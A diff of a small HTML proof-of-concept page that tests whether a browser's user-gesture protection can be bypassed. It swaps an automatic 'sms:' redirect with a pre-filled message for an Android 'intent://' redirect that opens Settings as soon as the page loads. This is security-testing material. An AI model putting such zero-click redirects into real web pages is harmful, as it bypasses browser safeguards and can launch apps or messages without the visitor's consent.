@@ -1,19 +1,19 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Messages Auto Launch Test</title>
+  <title>Settings Auto Launch Test</title>
 </head>
 <body>
-  <h1>Messages Auto Launch Test</h1>
-  <p>If the Messages app opens automatically with a pre-filled message, zero-click user-gesture bypass is confirmed.</p>
+  <h1>Settings Auto Launch Test</h1>
+  <p>If the Settings app opens automatically, Chrome user-gesture enforcement is bypassed.</p>
 
   <script>
-    // Auto-launch Messages with pre-filled SMS body
-    window.location.href = "sms:15551234567?body=Security%20Alert";
-    
-    // Optional: delayed launch for testing
+    // Attempt to launch Settings app via intent
+    window.location.href = "intent://#Intent;action=android.settings.SETTINGS;end";
+
+    // Optional: delayed attempt (helps on some devices)
     // setTimeout(() => {
-    //     window.location.href = "sms:15551234567?body=Delayed%20Test";
+    //     window.location.href = "intent://#Intent;action=android.settings.WIFI_SETTINGS;end";
     // }, 1000);
   </script>
 </body>
